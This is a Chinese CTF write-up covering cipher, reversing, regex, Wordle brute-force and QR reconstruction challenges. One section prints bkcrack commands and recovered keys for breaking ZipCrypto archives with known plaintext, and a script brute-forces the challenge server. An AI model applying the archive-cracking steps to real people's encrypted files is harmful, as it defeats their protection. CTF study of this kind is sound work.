第一阶段
一眼盯帧
synt{unirnavprtrrxtnzr}
其实就是个 Caesar 密码，注意到开头应该是 flag 立刻就出来了。
偏移量还挺对称，是 13。
flag{haveanicegeekgame}

小北问答!!!!!
我 Python 3.12 3.11 3.10 3.9 试了个遍，到 3.8 终于过了。
……我服了爸爸。
这「2023 年 10 月 1 日」简直是误导信息啊——不会罢不会罢不会有人 3202 年还在用 Python 3.8 罢（

汉化绿色版免费下载
普通下载的话，我是用 https://github.com/morkt/GARbro 解开 data.xp3 就看到代码了。
重点在高速下载。
用 https://github.com/arcusmaximus/KirikiriTools 的 KirikiriDescrambler 可以解开存档，知道 Hash 是 7748521。
用 JS 表示生成 Hash 的算法的话，大概是这个样子：
``` 
'use strict';

let text = 'flag{';
let hash = 1337n;

const hashOffset = { A: 11n, E: 22n, I: 33n, O: 44n, U: 55n, '}': 66n };

// IDK
let content = 'AEIOU}';

for (let chr of content) {
    hash *= 13337n;
    hash += hashOffset[chr];
    hash %= 19260817n;
};

// The hash should be 7748521n
console.log(hash);
```
你们膜的数不要太暴力了（恼）
至少 13337 和 19260817 都是质数。
但是从每一步循环的式子 (13337x + offset) mod 19260817 似乎能知道甚么……（
这实际上就是在有限域 GF(19260817) 作运算。
如果 flag{ 后有 n 位的话，整个和大概就可以写成多项式 sum{i=0→n}(13337^(n-i)offset[i]) 罢。当中 offset[0] 就是 1337，offset[n] 自然是 66——因为 flag 以 } 结束。
13337 在 GF(19260817) 中的乘法逆元是 (13337^(19260817-2)) mod 19260817，也即 5692895。
于是很快就能从 7748521 和 66 逆推出 17633825。
可是接下来该怎么办呢？毕竟每一位还有 AEIOU 五种可能。
后来我注意到 datasu.ksd 实际上有一些 trail_round1_sel_a 的字眼，看上去似乎是 round1 中触发 sel_a 的次数。
节选一下。
```
 "trail_round1_sel_i" => int 1,
 "trail_round1_round_1" => int 1,
 "trail_round1_sel_fin" => int 1,
 "trail_round1_sel_a" => int 6,
 "trail_round1_sel_end" => int 17,
 "trail_round1_sel_e" => int 3,
 "trail_round1_sel_o" => int 6,
```
注意到 trail_round1_round_1 为 1，说明整个存档就玩过这么一次。另外 1+1+6+3+6=17，似乎增加了猜想的可信程度。
就是说抛开 } 还有 16 位；其中 A 有 6 个，E 有 3 个，I 有 1 个，O 有 6 个……嗯？没有 U！
这样对 17633825 而言 offset 的取值集合实际上就是 {11, 22, 33, 44}，55 已经排除掉了；而且对应的多项式的形式也已经确定了，就是，13337^16×1337+sum{i=1→16}(13337^(16-i)offset[i])。
移项就得到了 GF(19260817) 下的方程 sum{i=1→16}(13337^(16-i)offset[i])=7965841。
AEIO 的可能排列无非是 16!/(6!3!1!6!)=6726720 个，也不算多，干脆穷举算了。
「不多不多，多乎哉？不多也！」
——还不到 2^23 嘛（后仰）
顺便一提，如果用 numpy 算点乘的话一定要小心溢出——我一开始中坑算出两个结果，一看乘积都变成负数了（
↑当然两个都是错的。
跑出来一看：
[44, 44, 11, 11, 11, 11, 22, 11, 22, 33, 22, 11, 44, 44, 44, 44]
对应的就是 flag{OOAAAAEAEIEAOOOO} 了。

关键词过滤喵，谢谢喵
「字数统计喵」按照十进制计数原理来就好了嘛，满十进一。
所以我……
```
把【.】替换成【丁真】喵
把【\r】替换成【丁真】喵
把【\n】替换成【丁真】喵
把【((丁真)+)】替换成【\1灌注柯洁谢谢喵】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真丁真丁真】替换成【A】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【9】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【8】喵
把【丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【7】喵
把【丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【6】喵
把【丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【5】喵
把【丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【4】喵
把【丁真丁真丁真灌注柯洁谢谢喵】替换成【3】喵
把【丁真丁真灌注柯洁谢谢喵】替换成【2】喵
把【丁真灌注柯洁谢谢喵】替换成【1】喵
把【A】替换成【丁真】喵
把【((丁真)+)】替换成【\1灌注柯洁谢谢喵】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真丁真丁真】替换成【A】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【9】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【8】喵
把【丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【7】喵
把【丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【6】喵
把【丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【5】喵
把【丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【4】喵
把【丁真丁真丁真灌注柯洁谢谢喵】替换成【3】喵
把【丁真丁真灌注柯洁谢谢喵】替换成【2】喵
把【丁真灌注柯洁谢谢喵】替换成【1】喵
把【A】替换成【丁真】喵
把【((丁真)+)】替换成【\1灌注柯洁谢谢喵】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真丁真丁真】替换成【A】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【9】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【8】喵
把【丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【7】喵
把【丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【6】喵
把【丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【5】喵
把【丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【4】喵
把【丁真丁真丁真灌注柯洁谢谢喵】替换成【3】喵
把【丁真丁真灌注柯洁谢谢喵】替换成【2】喵
把【丁真灌注柯洁谢谢喵】替换成【1】喵
把【A】替换成【丁真】喵
把【((丁真)+)】替换成【\1灌注柯洁谢谢喵】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真丁真丁真】替换成【A】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【9】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【8】喵
把【丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【7】喵
把【丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【6】喵
把【丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【5】喵
把【丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【4】喵
把【丁真丁真丁真灌注柯洁谢谢喵】替换成【3】喵
把【丁真丁真灌注柯洁谢谢喵】替换成【2】喵
把【丁真灌注柯洁谢谢喵】替换成【1】喵
把【A】替换成【丁真】喵
把【((丁真)+)】替换成【\1灌注柯洁谢谢喵】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真丁真丁真】替换成【A】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【9】喵
把【丁真丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【8】喵
把【丁真丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【7】喵
把【丁真丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【6】喵
把【丁真丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【5】喵
把【丁真丁真丁真丁真灌注柯洁谢谢喵】替换成【4】喵
把【丁真丁真丁真灌注柯洁谢谢喵】替换成【3】喵
把【丁真丁真灌注柯洁谢谢喵】替换成【2】喵
把【丁真灌注柯洁谢谢喵】替换成【1】喵
把【灌注柯洁谢谢喵】替换成【0】喵
把【^$】替换成【0】喵
谢谢喵
```
嗯，反复替换——毕竟它测试例不会很长，够用了。

基本功
「简单的 Flag」对应的档案是 challenge_1.zip。用 7-Zip 打开发现是 ZipCrypto Store——它都没压缩！
所以就可以用 https://github.com/kimci86/bkcrack 尝试破解。
我透过 Google 搜寻「chromedriver_linux64.zip 5845152」，找到了当中 chromedriver_linux64.zip 的来源 https://chromedriver.storage.googleapis.com/89.0.4389.23/chromedriver_linux64.zip，这样就得到了一个档案的明文。
```
.\bkcrack.exe -C .\challenge_1.zip -c chromedriver_linux64.zip -p .\chromedriver_linux64.zip
```
[12:13:05] Keys
d60e85c2 da791f96 cbf42e57
好好好好好！
```
.\bkcrack.exe -C .\challenge_1.zip -c flag1.txt -k d60e85c2 da791f96 cbf42e57 -d .\flag1.txt
```
至于「冷酷的 Flag」，注意到 challenge_2.zip 中出现的 flag2.pcapng。
当然我知道 PcapNg 应该有 4D 3C 2B 1A 01 00 00 00 FF FF FF FF FF FF FF FF 这段，但是就在这里卡了很久。
其实输入的明文不在档案开头的话，要用 -o 指定偏移量才能解出来。
```
.\bkcrack.exe -C .\challenge_2.zip -c flag2.pcapng -p .\pcapng-header -o 8
```
[16:57:37] Keys
0c14e9c4 fdc94e6f 133ba92b
```
.\bkcrack.exe -C .\challenge_2.zip -c flag2.pcapng -k 0c14e9c4 fdc94e6f 133ba92b -d .\flag2.pcapng
```
打开一看：
AMD Ryzen 7 6800H with Radeon Graphics          (with SSE4.2)
64-bit Windows 10 (22H2), build 19045
……怎么这么巧，我这边的环境是：
AMD Ryzen 7 4800U with Radeon Graphics (with SSE4.2)
64-bit Windows 10 (22H2), build 19045
同款 Windows 是罢（

Emoji Wordle
Level 1「硬碰硬啊嗯」
```
'use strict';

const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const fs = require('fs');

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const main = async () => {
    let guessed = [
        ['🐙👚🐮👷💅👷👛🐸🐨🐺👄🐔👶👱🐷💊🐾👑🐠👆👓👝👄👤👺💇🐩👜🐾👀🐧👃🐾🐽👈🐟🐐💁👋🐥🐮👘👇🐽💁🐴👹👼👎👃👰👃💆👲👙👷💃💏🐴🐺👣🐖💆👯', '🟥🟥🟥🟥🟨🟥🟨🟥🟥🟥🟨🟥🟨🟨🟥🟨🟥🟥🟥🟨🟨🟨🟨🟨🟨🟥🟥🟨🟥🟥🟥🟨🟥🟥🟨🟥🟥🟨🟥🟥🟥🟨🟨🟥🟨🟥🟥🟨🟥🟨🟥🟨🟨🟨🟨🟥🟨🟥🟥🟥🟥🟥🟨🟥'],
        ['🐥👝💏👊👩🐿👢💀🐞🐚👏🐱🐿🐝👇🐟🐤🐷👥👺💁💆🐝👦👜🐦🐐👿💉🐾🐜👵👟🐸👆💏👵💊👢👪👒🐺👠🐑🐮🐷👧🐔🐠🐯👝💆🐴🐔🐺🐽👝👰👇👞👤🐙👦👩', '🟥🟨🟥🟥🟨🟥🟨🟥🟥🟥🟥🟥🟥🟥🟨🟥🟥🟥🟥🟨🟨🟨🟥🟨🟨🟥🟥🟨🟥🟥🟥🟨🟥🟥🟨🟥🟨🟨🟨🟥🟥🟥🟥🟥🟥🟥🟨🟥🟥🟥🟨🟨🟥🟥🟥🟥🟨🟥🟨🟨🟨🟥🟨🟨'],
        ['👳💈🐘👞🐖🐔🐦🐜👝👎🐹🐗👂💋👂💅👤👖🐑🐦🐚💍👯💈🐻🐑🐴🐷👩👸👨🐻👅🐘👌👽🐣💃🐧👢🐺👑🐙👋💊👴👓👒👫👿👔👀💌🐬🐜🐫👙🐴👶👲👶👿🐐👛', '🟨🟨🟥🟨🟥🟥🟥🟥🟨🟥🟥🟥🟨🟥🟨🟨🟨🟥🟥🟥🟥🟥🟥🟨🟥🟥🟥🟥🟨🟨🟥🟥🟨🟥🟥🟨🟥🟩🟥🟨🟥🟥🟥🟥🟨🟨🟨🟥🟥🟨🟨🟥🟥🟥🟥🟥🟨🟥🟨🟨🟨🟨🟥🟨'],
        ['🐝👔👹🐺🐨👠💎👑🐺👜👦🐐🐻👃👜🐽🐭👱👅👷🐪👊🐖👾💊👄👅🐕👖👗💋🐣🐧🐥👣👐💁🐢🐻👞🐒👀👮💂👐👁👨💊👗👚🐾👉👈👥🐥👋👃👂💍👢👶👿👌👐', '🟥🟨🟥🟥🟥🟥🟥🟥🟥🟨🟨🟥🟥🟨🟨🟥🟥🟨🟨🟥🟥🟥🟥🟥🟨🟨🟨🟥🟥🟨🟥🟥🟥🟥🟥🟥🟨🟥🟥🟨🟥🟥🟥🟨🟥🟩🟥🟨🟨🟥🟥🟨🟨🟥🟥🟥🟨🟨🟥🟨🟨🟨🟥🟥'],
        ['🐲👇👽👳🐢👕💃💍🐠🐾👵👰💅👎🐙👺👄🐡👓🐼👞🐽👎👐👚🐙👼👄🐚👸👸🐰👆👘👢👣👂👭🐖🐮🐱👓👓🐤👛🐖💎🐬👂🐝🐦👞🐥👎👞🐤👳👎👄👈👏💃👻👃', '🟥🟨🟨🟨🟥🟥🟨🟥🟥🟥🟨🟥🟨🟥🟥🟨🟨🟥🟨🟥🟨🟥🟥🟥🟥🟥🟨🟨🟥🟨🟨🟥🟨🟨🟨🟥🟨🟥🟥🟥🟥🟨🟨🟥🟨🟥🟥🟥🟨🟥🟥🟨🟥🟥🟨🟥🟨🟥🟨🟨🟥🟨🟥🟨'],
        ['🐑👚👠👅🐺💌💄🐟🐟🐾👏🐯🐙🐣👮🐶👔🐓💊👐👣👱👛💅🐘🐚👌🐿🐩👈👐💂💃💉🐯👽💂👸🐜🐰👓👾👝👀👾👟🐿👾👤👸🐷👌👪👞👓👭🐹👅🐜🐓💊👳💎👓', '🟥🟥🟥🟨🟥🟥🟨🟥🟥🟥🟥🟥🟥🟥🟥🟥🟩🟥🟨🟥🟥🟨🟨🟨🟥🟥🟥🟥🟥🟨🟥🟨🟨🟥🟥🟨🟨🟨🟥🟥🟨🟥🟨🟥🟥🟥🟥🟥🟨🟨🟥🟥🟥🟨🟨🟥🟥🟨🟥🟥🟨🟨🟥🟨'],
        ['🐘🐪👈🐕👞💀🐴🐯👵🐢👝🐽👢🐷👖🐭👳🐶💄🐫👦🐟👟👃👷👪💊👏👁💊🐔👀👟🐶🐥🐹🐞👰🐰👭🐠💉👯👰💆🐣🐷👮👧👈👀💋👇🐫👵👙🐸👺🐐🐩🐤💋👘👃', '🟥🟥🟨🟥🟨🟥🟥🟥🟨🟥🟨🟥🟨🟥🟥🟥🟨🟥🟨🟥🟨🟥🟥🟨🟥🟥🟨🟥🟨🟨🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟨🟥🟥🟥🟨🟨🟥🟥🟨🟥🟨🟨🟥🟨🟥🟥🟥🟥🟨🟨'],
        ['👁👱👆👘🐧👶👇🐬👜👍🐐👗💄💇🐺🐥🐭🐦🐺🐙🐶👉💃👩👎👮🐪👌🐟👸💉👀👸👒👕👅🐲💉👚👭🐡🐿🐑🐼👬🐙👣💇🐴🐡👐🐘💂👲👍👣👂👵🐺🐼🐖💃👮👽', '🟨🟨🟨🟨🟥🟨🟨🟥🟨🟥🟥🟨🟨🟥🟥🟥🟥🟥🟥🟥🟥🟨🟩🟨🟥🟥🟥🟥🟥🟨🟥🟥🟨🟥🟥🟨🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟨🟨🟥🟥🟨🟨🟥🟥🟥🟨🟥🟨'],
        ['🐚👧👅🐺👸💈👮🐴👀👜🐘🐧🐿🐩🐰👟👱🐼🐔🐐🐓👵🐩💃👓🐪🐽🐪💂👃👂👽👫👾👻🐐🐪🐴🐠🐨💅🐒💋💅🐥👁🐙👪🐸👙🐘🐖👾💏👙🐺👹👬👊👴👔👌👏💃', '🟥🟨🟨🟥🟨🟨🟥🟥🟥🟨🟥🟥🟥🟥🟥🟥🟨🟥🟥🟥🟥🟨🟥🟨🟨🟥🟥🟥🟨🟨🟨🟩🟥🟥🟥🟥🟥🟥🟥🟥🟨🟥🟥🟩🟥🟩🟥🟥🟥🟨🟥🟥🟥🟥🟨🟥🟥🟥🟥🟨🟨🟥🟥🟨'],
        ['👉🐜👲🐧👫👿🐸🐧👠👸💍🐼👩👹👷👯👰👵🐣🐝💇👥🐢👥👵🐖👜🐮🐹👕👬🐣🐕🐞💎👾👜👢🐹💏👻👁👧🐠💂👋👷👃👐👂🐿🐥👌🐛👍👓🐦🐓🐧👳👣🐗👘👇', '🟨🟥🟨🟥🟥🟨🟥🟥🟥🟨🟥🟥🟨🟥🟥🟥🟥🟨🟥🟥🟥🟥🟥🟥🟨🟥🟨🟥🟥🟥🟥🟥🟥🟥🟥🟥🟨🟨🟥🟥🟥🟨🟨🟥🟨🟥🟥🟨🟥🟨🟥🟥🟥🟥🟥🟨🟥🟥🟥🟨🟥🟥🟨🟨'],
        ['👒🐙🐝🐸💃👦🐯👙🐓👧🐲🐔👋💂👘👵🐢🐽👉🐘👵🐲👪💉🐻🐠👂👹👟🐹🐬👿🐓🐬💇👽🐨👝🐾👯🐿👸👎🐽👱👉👮💈👼👭👔🐴👢🐻💎🐭👷🐾💄👏🐔🐑👜🐬', '🟥🟥🟥🟥🟨🟨🟥🟨🟥🟨🟥🟥🟥🟨🟨🟨🟥🟥🟨🟥🟨🟥🟥🟥🟥🟥🟨🟥🟥🟥🟥🟨🟥🟥🟥🟨🟥🟨🟥🟥🟥🟨🟥🟥🟨🟨🟥🟨🟨🟥🟨🟥🟨🟥🟥🟥🟥🟥🟨🟥🟥🟥🟨🟥'],
        ['👵👸💄👢💁💊👜👺💂💊👿👅👿👳👝👿👔👩💅💊👿👙💃👧👔👝💁👈👈💄👳👽👸💅👵👴👛💃👂👆👛👴💊💅👦👁👁👩💊💈👩👈👵👳👢👦💆👇👄👙👵👓👳👛', '🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟨🟩🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨'],
        ['👜👽💂👵👔💊💄👝👃👵👅💆👓👄👘👜👔👃👼👛👜👝💃👤👵👸👂👂👼👝👜👽💆💆👗👽👸💃💊👶👃💅👄💅👞👁👇💄💂👱👺💄👝👦💄👢👼👓👆👉👴👂👘👤', '🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟨🟩🟨🟨🟨🟩🟨🟩🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨'],
        ['👓👞👼👔💊👱👳👆💂👈👴💆👄👩👙💆👔👦👿💊👅👗💃👢👞👃👔👇👉👁👧👽👗👸👦👁👔💃👘👶👦👁👝💅💄👁👸👜👜👆👵💈👄👔👅👄👦👇💄👲💆👜💊👢', '🟨🟨🟩🟨🟨🟨🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟨🟨🟨🟩🟨🟨🟩🟨🟨🟩🟨🟩🟨🟨🟨🟩🟨🟩🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨'],
        ['💂👊👣👡👨💀🐡🐦👺👾🐤👀👣👵👬🐴👪👰🐬👣🐼👟🐥👇💇👖💋👾👷🐶👌🐓🐹👠🐵👫💂👁👞👛👕👍🐾💍👃🐣💋👗🐳👍👐👉👤👕👅👋👭🐔🐪🐧👼👹👯🐢', '🟨🟥🟥🟨🟥🟥🟥🟥🟨🟥🟥🟥🟥🟨🟥🟥🟥🟥🟥🟥🟥🟥🟥🟨🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟨🟨🟨🟨🟥🟥🟥🟥🟨🟥🟥🟨🟥🟥🟥🟨🟨🟥🟨🟥🟥🟥🟥🟥🟨🟥🟥🟥'],
        ['👃👡👼👅👸👩👿👞👜💅👿💆💄💊💆👤👔👞👇👳👳👛💃👆👡👤👙👢👴👂👡👽👩👈👦👺👤💃👆👶👝💃👃💅👴👁👶👧👆💆👅💁👗👄👼👦💆👁👸👆👛💊👸👩', '🟨🟨🟩🟨🟨🟨🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟨🟨🟨🟩🟨🟨🟩🟨🟨🟩🟨🟩🟨🟨🟨🟩🟨🟩🟨🟨🟩🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨'],
        ['👢👺👼👛👇💁👓👗💅👵👼💆👘👗👗👝👔👈👂👆💃💂💃👺👶👸👛👔👓💆👄👽👈👙👦👿💁💃👓👶👱💈👸💅👤👁👵👶👆👸💁👝💁👩💆👘👦👜👿👉👺👅👜👼', '🟨🟨🟩🟨🟨🟨🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟩🟨🟨🟨🟨🟨🟩🟨🟩🟨🟨🟩🟨🟨🟩🟨🟩🟨🟩🟨🟩🟨🟩🟨🟨🟩🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟨🟨🟨'],
        ['💅💅👼💂💊👳👄👤👛👡👘💆👱👆👝👘👔💊👦👞👜👴💃👺👇👡👙👓👧💆👶👽👙👧👦👶💆💃👝👶💈💈👧💅👲👁👝👜👆👄👙👙👢👃💆👅👸👂👱👓👺👴👽👢', '🟨🟩🟩🟨🟨🟨🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟩🟨🟨🟨🟨🟨🟩🟨🟩🟨🟨🟩🟨🟨🟩🟨🟩🟨🟩🟨🟩🟨🟩🟨🟨🟩🟩🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟨🟨🟨'],
        ['👁💅👼💅👉👧💆👃👲👙👡💆👞💅👼👴👔👸👺👔👆👆💃👺👈👳👛💃👇💆💈👽👛💄👦👧👃💃👂👶👢💈👺💅👓👁👔👩👆👄💂👙👢👃💆👄👳👅👘👅👺👧👞👂', '🟨🟩🟩🟨🟨🟨🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟩🟨🟨🟨🟨🟨🟩🟨🟩🟩🟨🟩🟨🟨🟩🟨🟩🟨🟩🟨🟩🟨🟩🟨🟨🟩🟩🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟨🟨🟨'],
        ['👺💅👼👙👗👘👦👱💄👔👛💆👝👳👉👓👔👵👓👡💅👗💃👺👩👶👧👡💊💆👓👽👛👽👦👢👞💃💄👶💂💈👈💅👇👁👝👩👆👄👘👗👔👲💆👼👞👄👢👓👺💅👽👃', '🟨🟩🟩🟨🟨🟨🟨🟨🟨🟨🟨🟩🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟩🟨🟨🟨🟨🟨🟩🟨🟩🟩🟨🟩🟨🟨🟩🟨🟩🟨🟩🟩🟩🟨🟩🟨🟨🟩🟩🟨🟨🟨🟨🟩🟨🟨🟨🟨🟨🟩🟨🟨🟨'],
        ['👀💆👉🐸👅👖👓👶🐔💆👤👨💊👐🐴💋💉👓👛👍🐦🐒👑👏👠🐷🐠🐚👊🐻🐗🐒👈🐺👜🐭👝🐞👕💃🐪👟🐦💈👈🐽🐜🐣🐥🐥👓👽🐕👝👑💅🐟💍🐣👁🐕👨🐵👩', '🟥🟨🟨🟥🟨🟥🟨🟨🟥🟨🟨🟥🟨🟥🟥🟥🟥🟨🟨🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟨🟥🟨🟥🟨🟥🟥🟨🟥🟥🟥🟨🟨🟥🟥🟥🟥🟥🟨🟨🟥🟨🟥🟨🟥🟥🟥🟨🟥🟥🟥🟨']
    ];

    let done = false;

    while (!done) {
        let possible = new Set();
        let known = [];
        known.length = 64;

        for (let [ans, hint] of guessed) {
            ans = [...ans];
            hint = [...hint];

            let offset = 0;
            while (offset < 64) {
                if (hint[offset] !== '🟥') {
                    possible.add(ans[offset]);
                };
                if (hint[offset] === '🟩') {
                    known[offset] = ans[offset];
                };
                offset += 1;
            };
        };

        possible = [...possible];

        done = true;
        let str = '';
        for (let chr of known) {
            str += chr ? chr : (done = false) || possible[Math.floor(Math.random() * possible.length)];
        };
        console.log(str);

        let get = await fetch(new URL(`https://prob14.geekgame.pku.edu.cn/level1?guess=${str}`));
        let getBuf = await get.arrayBuffer();
        let html = Buffer.from(getBuf).toString();
        guessed.push([str, html.match(/results.push\("(.*)"\)/)[1]]);

        await sleep(500);
    };

    fs.writeFileSync('Wordle Level 1.json', Buffer.from(JSON.stringify(guessed)));
};

main();
```

绝妙的多项式
进 IDA 大致看了下，发现有个 mint，应该说就是在有限域 GF(998244353) 作运算。
但是我一看到 IDA 出来的伪代码就困，还是放弃好了。

华维码
Hard 部分没甚么好说的，先把能定的位置定了然后穷举筛查就行。扫出来就是 Flag。
要注意的是 QR 码本身有一些定死的像素，它可以作为筛查的约束条件。
Nano 部分运气实在爆棚——不知为何从 Fiddler 存下来的分块图片名都是数字序号，摆好定位点后按序号从左到右从上至下拼剩下的块，居然一遍过了……
能拼出来倒也是个奇迹。其实我觉得分块细化了容错程度应该还更高了。
——你以为我真的不知道正解吗？
将 Version 7（即 45×45）的 QR 码按 5×5 分割成 81 块，不难看出最中间的校正图形被完整切下。但是从服务器获取的 80 张图中并没有出现完整的校正图形，说明丢弃的刚好只有这一块。
接下来再把能够确定的含有寻象图形和校正图形的块拼出来就好，于是只剩下了 63 块。
```
#######_##????????????????????????__#_#######
#_____#_##????????????????????????_#__#_____#
#_###_#__#????????????????????????_#__#_###_#
#_###_#___????????????????????????_##_#_###_#
#_###_#_#_??????????#####?????????###_#_###_#
#_____#_#_??????????#___#?????????____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________##??????????#___#??????????##________
###__##_#_??????????#####??????????#_####__##
###_#___#_??????????_#___??????????#_#_##__##
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
????#####_??????????#####??????????######????
????#___#_??????????#___#??????????_#___#????
????#_#_##??????????#_#_#??????????_#_#_#????
????#___##??????????#___#??????????##___#????
????#####_??????????#####??????????######????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
____#_#??????????????????????????????????????
_####____#??????????#_#__??????????###_#?????
#__##_#_#_??????????#####??????????######????
________##??????????#___#??????????##___#????
#######___??????????#_#_#??????????##_#_#????
#_____#_##??????????#___#??????????_#___#????
#_###_#___??????????#####???????????#####????
#_###_#__#???????????????????????????????????
#_###_#_##???????????????????????????????????
#_____#_#_???????????????????????????????????
#######_##???????????????????????????????????
```
这时候已经能从角标看出纠错等级为 L，掩码款式是 1。
然后推断右下角是甚么。第一个块一般是 8-bit Byte（0100），也有可能是 ECI（0111）；别的基本不用考虑。
既然如此，最右下角两个像素从左到右就应该是白黑，两者之上的像素或者全白或者全黑。而且考虑到那一块沾了点校正图形的边，左上角的像素必须是黑色。于是只有 010d1361.png 符合要求。
这下只剩下 62 块了。
```
#######_##????????????????????????__#_#######
#_____#_##????????????????????????_#__#_____#
#_###_#__#????????????????????????_#__#_###_#
#_###_#___????????????????????????_##_#_###_#
#_###_#_#_??????????#####?????????###_#_###_#
#_____#_#_??????????#___#?????????____#_____#
#######_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#_#######
________##??????????#___#??????????##________
###__##_#_??????????#####??????????#_####__##
###_#___#_??????????_#___??????????#_#_##__##
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
????#####_??????????#####??????????######????
????#___#_??????????#___#??????????_#___#????
????#_#_##??????????#_#_#??????????_#_#_#????
????#___##??????????#___#??????????##___#????
????#####_??????????#####??????????######????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
??????#??????????????????????????????????????
??????_??????????????????????????????????????
____#_#??????????????????????????????????????
_####____#??????????#_#__??????????###_#?????
#__##_#_#_??????????#####??????????######????
________##??????????#___#??????????##___#????
#######___??????????#_#_#??????????##_#_#????
#_____#_##??????????#___#??????????_#___#????
#_###_#___??????????#####???????????######_##
#_###_#__#??????????????????????????????#__##
#_###_#_##??????????????????????????????#_###
#_____#_#_??????????????????????????????#____
#######_##??????????????????????????????__#_#
```
……《只》？你先别急喵，看看多拼出来的块有甚么信息喵。
按 Z 字形阅读第一组八位得到 01000011——0100 说明它是 8-Bit Byte 模式，0011 说明它的长度在 48（即 01000000）和 63（即 01001111）之间。
就 QR Version 7 而言数据实际上是按八位组交错排列，L 纠错等级下 8-bit Byte 模式的最大容量是 154。63 比起 154 的一半来说还是小了个 14，所以有理由认为第二组八位已经是填充数据了。
